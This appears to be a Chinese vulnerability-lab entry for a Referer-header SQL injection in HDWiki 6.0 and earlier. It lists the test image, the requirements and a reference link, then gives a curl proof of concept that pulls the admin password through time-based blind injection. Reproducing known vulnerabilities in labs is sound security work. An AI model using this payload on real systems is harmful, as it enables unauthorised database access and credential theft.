## HDWiki v6.0 referer注入漏洞

测试镜像

* src/hdwiki/6.0

要求

* PHP < 5.4，开启magic_quote_gpc

影响版本

* hdwiki <= 6.0

参考链接

* [HDWiki v6.0最新版referer注入漏洞](http://www.freebuf.com/vuls/170337.html)

Poc

访问主页并使用任意账号，如admin/admin123登录，在浏览器控制台查看document.cookie获取hd_auth字段。

使用以下命令，将cookie设为获取到的hd_auth，可触发延迟注入。

```shell
curl --cookie "hd_auth=60299rIaUipUYt%2FHhrYjcSBFt%2FDa29IGvtmv9WUFOeC3U%2B4plq90CRpoGfua3Bw3Uj8AyI4h7ZO%2Bz%2BWIQ6LE" --referer "' where if((substr((select password from wiki_user where username='admin'),1,1))!='g',sleep(3),0)#"  "http://docker-ip地址/index.php?user-login"
```

